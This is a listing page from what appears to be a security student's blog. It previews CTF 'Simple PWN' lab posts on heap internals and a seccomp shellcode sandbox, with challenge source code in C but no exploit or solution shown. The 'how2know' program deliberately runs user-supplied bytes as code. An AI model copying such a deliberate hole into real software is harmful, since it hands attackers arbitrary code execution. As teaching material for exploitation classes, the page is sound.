#include &lt;stdlib.h&gt;

static char flag[0x30];

int main()
{
    void *addr;
    int fd;
    scmp_filter_ctx ctx;

    addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if ((unsigned long)addr == -1)
        perror(&#34;mmap&#34;), exit(1);
    
    fd = open(&#34;/home/chal/flag&#34;, O_RDONLY);
    if (fd == -1)
        perror(&#34;open&#34;), exit(1);
    read(fd, flag, 0x30);
    close(fd);

    write(1, &#34;talk is cheap, show me the code\n&#34;, 33);
    read(0, addr, 0x1000);

    ctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);

    ((void(*)())addr)();

    return 0;
}
</code></pre><p>:::</p><a href=/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/>Simple PWN - 0x14(Simple HEAP)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-pwn---0x14simple-heap>Simple PWN - 0x14(Simple HEAP)
<a class=anchor href=#simple-pwn---0x14simple-heap>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>Version: Ubuntu 20.04</p><h2 id=heap-background>HEAP background
<a class=anchor href=#heap-background>#</a></h2><p><a href=https://youtu.be/rMqvL9j0QaM>Advanced Binary Exploitation (Pwn) - Heap Exploitation</a>
<a href=https://youtu.be/Xppj8lA04qQ>SS111-Pwn2</a></p><h2 id=allocate-a-memory>Allocate a memory
<a class=anchor href=#allocate-a-memory>#</a></h2><h3 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h3><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    void *ptr;
    ptr = malloc(0x30);
    return 0;
}
</code></pre><pre tabindex=0><code class=language-bash! data-lang=bash!>$ sudo gcc -o simple_heap simple_heap.c -no-pie
</code></pre><h3 id=analyze>Analyze
<a class=anchor href=#analyze>#</a></h3><ul><li><p>Before executing <code>malloc</code>, there is no <code>heap</code> space in memory layout
<img src=https://imgur.com/h9ibSyk.png alt></p><a href=/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/>Simple PWN - 0x15(Lab - `heapmath`)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-pwn---0x15lab---heapmath>Simple PWN - 0x15(Lab - <code>heapmath</code>)
<a class=anchor href=#simple-pwn---0x15lab---heapmath>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>Version: Ubuntu 20.04</p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;time.h&gt;

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    srand(time(NULL));

    void *tcache_chk[7]                = {0};
    unsigned char tcachebin[3][7]      = {0}; // 0x20, 0x30, 0x40
    unsigned int tcachebin_counts[4]   = {0};
    unsigned long tcache_size[7]       = {0};
    unsigned long tcache_free_order[7] = {0};

    puts(&#34;----------- ** tcache chall ** -----------&#34;);
    unsigned long tmp = 0;
    for (int i = 0; i &lt; 7; i++) {
        tmp = (rand() % 0x21) + 0x10; // 0x10 ~ 0x30
        tcache_size[i] = tmp;
    }

    for (int i = 0; i &lt; 7; i++) {
    repeat:
        tmp = rand() % 7;
        for (int j = 0; j &lt; i; j++)
            if (tmp == tcache_free_order[j]) goto repeat;
        tcache_free_order[i] = tmp;
    }

    for (int i = 0; i &lt; 7; i++) {
        tcache_chk[i] = malloc( tcache_size[i] );
        printf(&#34;char *%c = (char *) malloc(0x%lx);\n&#34;, &#39;A&#39; + i, tcache_size[i]);
    }

    for (int i = 0; i &lt; 7; i++) {
        int idx = tcache_free_order[i];
        free(tcache_chk[ idx ]);
        printf(&#34;free(%c);\n&#34;, &#39;A&#39; + (unsigned char) idx);

        tmp = tcache_size[ idx ] - 0x8;
        if (tmp % 0x10)
            tmp = (tmp &amp; ~0xf) + 0x20;
        else
            tmp += 0x10;

        unsigned int binidx = ((tmp - 0x20) / 0x10);
        unsigned int bincnt = tcachebin_counts[ binidx ];
        tcachebin[ binidx ][ bincnt ] = &#39;A&#39; + (unsigned char) idx;
        tcachebin_counts[ binidx ]++;
    }

    char tmpbuf[0x100]   = {0};
    char ansbuf[3][0x100] = {0};
    for (int i = 0; i &lt; 3; i++) {
        for (int j = 6; j &gt;= 0; j--)
            if (tcachebin[i][j]) {
                sprintf(tmpbuf, &#34;%c --&gt; &#34;, tcachebin[i][j]);
                strcat(ansbuf[i], tmpbuf);
            }
        strcat(ansbuf[i], &#34;NULL&#34;);
    }
    puts(&#34;&#34;);
    for (int i = 0; i &lt; 3; i++) {
        printf(&#34;[chunk size] 0x%x: &#34;, (i+2) * 0x10);
        if (i == 0) {
            printf(&#34;%s\t(just send \&#34;%s\&#34;)\n&#34;, ansbuf[i], ansbuf[i]);
        } else {
            printf(&#34;?\n&gt; &#34;);
            fgets(tmpbuf, 0x100, stdin);
            if (!strncmp(tmpbuf, ansbuf[i], strlen(ansbuf[i]))) {
                puts(&#34;Correct !&#34;);
            } else {
                puts(&#34;Wrong !&#34;);
                printf(&#34;Ans: \&#34;%s\&#34;\n&#34;, ansbuf[i]);
                exit(0);
            }
        }
    }

    puts(&#34;\n----------- ** address chall ** -----------&#34;);
    int cmp1 = 0;
    int cmp2 = 0;
    unsigned long ans_addr = 0;

    cmp1 = rand() % 7;
    while ((cmp2 = rand() % 7) == cmp1);
    if (cmp1 &gt; cmp2) {
        tmp = cmp1;
        cmp1 = cmp2;
        cmp2 = tmp;
    }

    printf(&#34;assert( %c == %p );\n&#34;, &#39;A&#39; + cmp1, tcache_chk[ cmp1 ]);
    printf(&#34;%c == ?\t(send as hex format, e.g. \&#34;%p\&#34;)\n&gt; &#34;,
                &#39;A&#39; + cmp2, tcache_chk[ cmp1 ]);
    scanf(&#34;%s&#34;, tmpbuf);
    ans_addr = strtoul(tmpbuf, NULL, 16);

    if (ans_addr == (unsigned long) tcache_chk[ cmp2 ]) {
        puts(&#34;Correct !&#34;);
    } else {
        puts(&#34;Wrong !&#34;);
        printf(&#34;Ans: %p\n&#34;, tcache_chk[ cmp2 ]);
        exit(0);
    }

    puts(&#34;\n----------- ** index chall ** -----------&#34;);
    unsigned long *fastbin[2] = {0};
    unsigned long fastbin_size = 0;
    unsigned long secret_idx = 0, result_idx = 0, res = 0;

    fastbin_size = (rand() % 0x31) + 0x40; // 0x40 ~ 0x70
    fastbin_size &amp;= ~0xf;
    fastbin[0] = (unsigned long *) malloc( fastbin_size );
    fastbin[1] = (unsigned long *) malloc( fastbin_size );
    
    printf(&#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\n&#34;, &#39;X&#39;, fastbin_size);
    printf(&#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\n&#34;, &#39;Y&#39;, fastbin_size);

    secret_idx = rand() % (fastbin_size / 8);
    fastbin[1][ secret_idx ] = 0xdeadbeef;
    result_idx = ((unsigned long)(&amp;fastbin[1][ secret_idx ]) - (unsigned long)(&amp;fastbin[0][0])) / 8;
    
    printf(&#34;Y[%lu] = 0xdeadbeef;\n&#34;, secret_idx);
    printf(&#34;X[?] == 0xdeadbeef\t(just send an integer, e.g. \&#34;8\&#34;)\n&gt; &#34;);
    scanf(&#34;%lu&#34;, &amp;res);

    if (fastbin[0][res] == 0xdeadbeef) {
        puts(&#34;Correct !&#34;);
    } else {
        puts(&#34;Wrong !&#34;);
        printf(&#34;Ans: %lu\n&#34;, result_idx);
        exit(0);
    }

    puts(&#34;\n----------- ** tcache fd chall ** -----------&#34;);
    free(fastbin[0]);
    free(fastbin[1]);
    printf(&#34;free(X);\nfree(Y);\nassert( Y == %p );\n&#34;, fastbin[1]);
    printf(&#34;fd of Y == ?\t(send as hex format, e.g. \&#34;%p\&#34;)\n&gt; &#34;, fastbin[1]);
    scanf(&#34;%s&#34;, tmpbuf);
    ans_addr = strtoul(tmpbuf, NULL, 16);

    if (ans_addr == *fastbin[1]) {
        puts(&#34;Correct !&#34;);
    } else {
        puts(&#34;Wrong !&#34;);
        printf(&#34;Ans: 0x%lx\n&#34;, *fastbin[1]);
        exit(0);
    }

    puts(&#34;\n----------- ** fastbin fd chall (final) ** -----------&#34;);
    puts(&#34;[*] Restore the chunk to X and Y&#34;);
    printf(&#34;%c = (unsigned long *) malloc(0x%lx);\n&#34;, &#39;Y&#39;, fastbin_size);
    printf(&#34;%c = (unsigned long *) malloc(0x%lx);\n&#34;, &#39;X&#39;, fastbin_size);
    fastbin[1] = malloc(fastbin_size);
    fastbin[0] = malloc(fastbin_size);
    printf(&#34;[*] Do something to fill up 0x%lx tcache\n...\n[*] finish\n&#34;, fastbin_size + 0x10);
    void *tmpchk[7];
    for (int i = 0; i &lt; 7; i++)
        tmpchk[i] = malloc(fastbin_size);
    for (int i = 0; i &lt; 7; i++)
        free(tmpchk[i]);
    printf(&#34;free(X);\nfree(Y);\nassert( Y == %p );\n&#34;, fastbin[1]);
    free(fastbin[0]);
    free(fastbin[1]);
    printf(&#34;fd of Y == ?\t(send as hex format, e.g. \&#34;%p\&#34;)\n&gt; &#34;, fastbin[1]);
    scanf(&#34;%s&#34;, tmpbuf);
    ans_addr = strtoul(tmpbuf, NULL, 16);

    if (ans_addr == *fastbin[1]) {
        puts(&#34;Correct !&#34;);
        memset(tmpbuf, 0, 0x31);
        
        int fd = open(&#34;/home/heapmath/flag&#34;, O_RDONLY);
        read(fd, tmpbuf, 0x30);
        close(fd);
        printf(&#34;Here is your flag: %s\n&#34;, tmpbuf);
    } else {
        puts(&#34;Wrong !&#34;);
        printf(&#34;Ans: 0x%lx\n&#34;, *fastbin[1]);
        exit(0);
    }
}
</code></pre><p>:::</p><a href=/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/>Simple PWN 0x16(simple_smallbin)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-pwn-0x16simple_smallbin>Simple PWN 0x16(simple_smallbin)
<a class=anchor href=#simple-pwn-0x16simple_smallbin>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>Version: Ubuntu 20.04</p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><img src=https://imgur.com/teWNhbh.png alt></p><p><img src=https://imgur.com/kCTN7cs.png alt></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    void *ptrs[7];
    void *smallbin;
    int i;

    for (i = 0; i &lt; 7; i++)
        ptrs[i] = malloc(0x108); // 0x110 chunk size

    smallbin = malloc(0x108);
    malloc(0x18);

    // aim to fill up tcache
    while(i)
        free(ptrs[--i]);
    
    free(smallbin);
    // trigger unsorted bin dispatch
    malloc(0x870);

    return 0;
}
</code></pre><p>:::</p><a href=/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/>...</a></p></article><ul class="pagination pagination-default"><li class=page-item><a href=/tags/ctf/ aria-label=First class=page-link role=button><span aria-hidden=true>&#171;&#171;</span></a></li><li class=page-item><a href=/tags/ctf/page/17/ aria-label=Previous class=page-link role=button><span aria-hidden=true>&#171;</span></a></li><li class=page-item><a href=/tags/ctf/page/16/ aria-label="Page 16" class=page-link role=button>16</a></li><li class=page-item><a href=/tags/ctf/page/17/ aria-label="Page 17" class=page-link role=button>17</a></li><li class="page-item active"><a aria-current=page aria-label="Page 18" class=page-link role=button>18</a></li><li class=page-item><a href=/tags/ctf/page/19/ aria-label="Page 19" class=page-link role=button>19</a></li><li class=page-item><a href=/tags/ctf/page/20/ aria-label="Page 20" class=page-link role=button>20</a></li><li class=page-item><a href=/tags/ctf/page/19/ aria-label=Next class=page-link role=button><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=/tags/ctf/page/27/ aria-label=Last class=page-link role=button><span aria-hidden=true>&#187;&#187;</span></a></li></ul><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></div></aside></main></body></html>